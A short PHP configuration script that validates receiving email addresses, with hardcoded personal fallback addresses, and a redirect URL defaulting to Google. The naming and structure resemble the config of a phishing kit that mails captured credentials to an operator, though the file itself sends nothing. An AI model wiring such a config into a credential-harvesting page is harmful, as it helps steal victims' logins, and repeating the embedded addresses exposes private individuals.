<?php
// Retrieve email addresses from environment variables for flexibility
$Receive_email = getenv('RECEIVER_EMAIL') ?: 'matthew@harveyfamilyconnection.net';
$redirect = getenv('REDIRECT_URL') ?: 'https://www.google.com/'; // Default redirect URL if not set

// Validate email addresses formatting (handle comma-separated lists)
$emails = explode(',', $Receive_email);
$validEmails = [];
foreach ($emails as $email) {
    $email = trim($email); // Remove white spaces
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $validEmails[] = $email; // Add valid email to array
    } else {
        error_log("Invalid email format: {$email}");
    }
}

// Fall back to hardcoded email if no valid emails
if (empty($validEmails)) {
    error_log("No valid emails found in RECEIVE_EMAIL. Falling back to default.");
    $validEmails[] = 'triciacapital@gmail.com'; // Add fallback email
}

// Join validated email addresses back into a string
$Receive_email = implode(',', $validEmails);

// Debugging log to monitor final configurations
error_log("Final Receive_email: {$Receive_email}");
error_log("Redirect URL: {$redirect}");
?>
